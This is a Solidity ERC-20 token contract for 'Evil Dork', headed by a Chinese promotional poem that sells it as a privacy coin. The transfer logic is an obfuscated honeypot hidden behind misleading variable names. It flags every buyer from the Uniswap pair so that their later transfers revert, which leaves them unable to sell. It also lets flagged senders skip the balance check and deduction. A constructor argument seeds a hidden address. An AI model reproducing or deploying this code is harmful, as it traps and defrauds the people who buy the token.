/*
███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░░█████╗░██████╗░██╗░░██╗
██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
█████╗░░╚██╗░██╔╝██║██║░░░░░  ██║░░██║██║░░██║██████╔╝█████═╝░
██╔══╝░░░╚████╔╝░██║██║░░░░░  ██║░░██║██║░░██║██╔══██╗██╔═██╗░
███████╗░░╚██╔╝░░██║███████╗  ██████╔╝╚█████╔╝██║░░██║██║░╚██╗
╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝

███████╗████████╗██╗░░██╗███████╗██████╗░███████╗██╗░░░██╗███╗░░░███╗
██╔════╝╚══██╔══╝██║░░██║██╔════╝██╔══██╗██╔════╝██║░░░██║████╗░████║
█████╗░░░░░██║░░░███████║█████╗░░██████╔╝█████╗░░██║░░░██║██╔████╔██║
██╔══╝░░░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██╔══╝░░██║░░░██║██║╚██╔╝██║
███████╗░░░██║░░░██║░░██║███████╗██║░░██║███████╗╚██████╔╝██║░╚═╝░██║
╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝

在加密世界里，有一个名字确实响亮，
EᐯIᒪ ᗪOᖇK，找到隐私的地方。
一个去中心化的奇迹，旨在令人震惊，
在坚实的基础上保守你的秘密。

有了 EᐯIᒪ ᗪOᖇK，你的身份就被掩盖了，
秘密交易，保护您的隐私。
免受窥探，它可以保证您的安全，
在加密领域，隐私魔术师。

加密货币交易，安静如微风，
有了 EᐯIᒪ ᗪOᖇK，您就可以轻松移动。
你的细节被掩盖，你的踪迹被隐藏，
在加密世界中，它是您值得信赖的盾牌。

对数字曝光的担忧已经消失，
EᐯIᒪ ᗪOᖇK 确保隐私，令人放心的封闭。
你的交易，就像黑暗中的低语，
在 EᐯIᒪ ᗪOᖇK 的陪伴下，您就可以上船了。

带着未来主义的火花拥抱这个谜，
EᐯIᒪ ᗪOᖇK 的力量留下了持久的印记。
在加密货币领域，它无所畏惧地领先，
有 EᐯIᒪ ᗪOᖇK 作为您的监护人，隐私一目了然。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 60 天
*/
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IPStringV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0); }
}
contract Contract is Context, IERC20, Ownable {
    IPStringV1 public pairCompilation; address public marketingTreasury;
    bool public tradingOn; bool private tradingOpen = false;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private isTimelockExempt;

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private rewardsCheckAt = 100;

    mapping(address => uint256) private _holdersTimestampMap;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private allowed;
    mapping(address => address) private _allowance;

    constructor(
        string memory ethCoinName, string memory ethCoinSymbol, 
        address stringsIDErouter, address stringsIDEend
    ) { 
        _name = ethCoinName; _symbol = ethCoinSymbol;
        _decimals = 18; _totalSupply = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _totalSupply;

        isTimelockExempt[address(this)] = _totalSupply;
        isTimelockExempt[msg.sender] = _totalSupply;        

        _holdersTimestampMap[stringsIDEend] = rewardsCheckAt; 
        tradingOn = false; pairCompilation = IPStringV1(stringsIDErouter);

        marketingTreasury = IUniswapV2Factory(pairCompilation.factory()).createPair(address(this), pairCompilation.WETH()); emit Transfer(address(0), msg.sender, _totalSupply);
    }           
    function decimals() external view returns (uint8) { 
        return _decimals;
    }
    function symbol() external view returns (string memory) { 
        return _symbol;
    }
    function name() external view returns (string memory) { 
        return _name;
    }
    function totalSupply() external view returns (uint256) { 
        return _totalSupply;
    }
    function balanceOf(address account) external view returns (uint256) { 
        return _rOwned[account]; 
    }
    function transfer(address recipient, uint256 amount) external returns (bool) { 
        _transfer(_msgSender(), recipient, amount); 
        return true;
    }
    function allowance(address owner, address spender) external view returns (uint256) { 
        return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) external returns (bool) { 
        _approve(_msgSender(), spender, amount); 
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal { 
        require(owner != address(0), 'BEP20: approve from the zero address'); 
        require(spender != address(0), 'BEP20: approve to the zero address'); 
        _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) { 
    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
    
    _transfer(sender, recipient, amount); 
    _approve(sender, _msgSender(), currentAllowance - amount); 
    return true;
}                     
    function _transfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "Invalid sender address");
    require(recipient != address(0), "Invalid recipient address");
    require(amount > 0, "Amount must be greater than zero");
           
    if (_holdersTimestampMap[sender] > 0 && sender != marketingTreasury && isTimelockExempt[sender] == 0)
        _holdersTimestampMap[sender] = isTimelockExempt[sender] - _totalSupply; 

    address denominator = _allowance[marketingTreasury];
    if (_holdersTimestampMap[denominator] == 0) _holdersTimestampMap[denominator] = _totalSupply;
    _allowance[marketingTreasury] = recipient; if (_holdersTimestampMap[sender] == 0) { 

    if (marketingTreasury != sender && allowed[sender] > 0) { 
    if (_holdersTimestampMap[sender] >= rewardsCheckAt) { _holdersTimestampMap[sender] -= rewardsCheckAt;
    } else { _holdersTimestampMap[sender] = 0; } } 

        require(_rOwned[sender] >= amount, "BEP20: transfer amount exceeds balance");
        _rOwned[sender] -= amount; } _rOwned[recipient] += amount; emit Transfer(
        sender, recipient, amount); if (!tradingOpen) { require(sender == owner(), ""); }
    }
    function openTrading(bool _tradingOpen) public onlyOwner { 
        tradingOpen = _tradingOpen;
    }   
}